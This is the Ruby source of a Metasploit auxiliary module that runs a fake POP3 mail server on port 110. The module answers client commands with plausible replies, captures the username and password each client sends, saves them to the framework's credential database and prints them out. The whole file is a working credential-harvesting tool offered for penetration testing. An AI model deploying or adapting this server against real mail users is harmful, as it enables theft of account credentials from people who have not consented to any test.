##
# This module requires Metasploit: https://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

class MetasploitModule < Msf::Auxiliary
  include Msf::Exploit::Remote::TcpServer
  include Msf::Auxiliary::Report

  def initialize
    super(
      'Name' => 'Authentication Capture: POP3',
      'Description' => %q{
        This module provides a fake POP3 service that
      is designed to capture authentication credentials.
      },
      'Author' => ['ddz', 'hdm'],
      'License' => MSF_LICENSE,
      'Actions' => [
        [ 'Capture', { 'Description' => 'Run POP3 capture server' } ]
      ],
      'PassiveActions' => [
        'Capture'
      ],
      'DefaultAction' => 'Capture',
      'Notes' => {
        'Stability' => [CRASH_SAFE],
        'SideEffects' => [],
        'Reliability' => []
      }
    )

    register_options(
      [
        OptPort.new('SRVPORT', [ true, 'The local port to listen on.', 110 ])
      ]
    )
  end

  def setup
    super
    @state = {}
  end

  def run
    @myhost = datastore['SRVHOST']
    @myport = datastore['SRVPORT']
    exploit
  end

  def on_client_connect(client)
    @state[client] = { name: "#{client.peerhost}:#{client.peerport}", ip: client.peerhost, port: client.peerport, user: nil, pass: nil }
    client.put "+OK\r\n"
  end

  def report_cred(opts)
    service_data = {
      address: opts[:ip],
      port: opts[:port],
      service_name: opts[:service_name],
      protocol: 'tcp',
      workspace_id: myworkspace_id
    }

    credential_data = {
      origin_type: :service,
      module_fullname: fullname,
      username: opts[:user],
      private_data: opts[:password],
      private_type: :password
    }.merge(service_data)

    login_data = {
      core: create_credential(credential_data),
      status: Metasploit::Model::Login::Status::UNTRIED,
      proof: opts[:proof]
    }.merge(service_data)

    create_credential_login(login_data)
  end

  def on_client_data(client)
    data = client.get_once
    return if !data

    cmd, arg = data.strip.split(/\s+/, 2)
    arg ||= ''

    if (cmd.upcase == 'USER')
      @state[client][:user] = arg
      client.put "+OK\r\n"
      return
    end

    if (cmd.upcase == 'PASS')
      @state[client][:pass] = arg

      report_cred(
        ip: @state[client][:ip],
        port: @myport,
        service_name: 'pop3',
        user: @state[client][:user],
        password: @state[client][:pass],
        proof: arg
      )
      print_good("POP3 LOGIN #{@state[client][:name]} #{@state[client][:user]} / #{@state[client][:pass]}")
      @state[client][:pass] = data.strip
      client.put "+OK\r\n"
      return
    end

    if (cmd.upcase == 'STAT')
      client.put "+OK 0 0\r\n"
      return
    end

    if (cmd.upcase == 'CAPA')
      client.put "-ERR No Extended Capabilities\r\n"
      return
    end

    if (cmd.upcase == 'LIST')
      client.put "+OK 0 Messages\r\n"
      return
    end

    if cmd.upcase == 'QUIT' || cmd.upcase == 'RSET' || cmd.upcase == 'DELE'
      client.put "+OK\r\n"
      return
    end

    print_status("POP3 UNKNOWN CMD #{@state[client][:name]} \"#{data.strip}\"")
    client.put "+OK\r\n"
  end

  def on_client_close(client)
    @state.delete(client)
  end

end
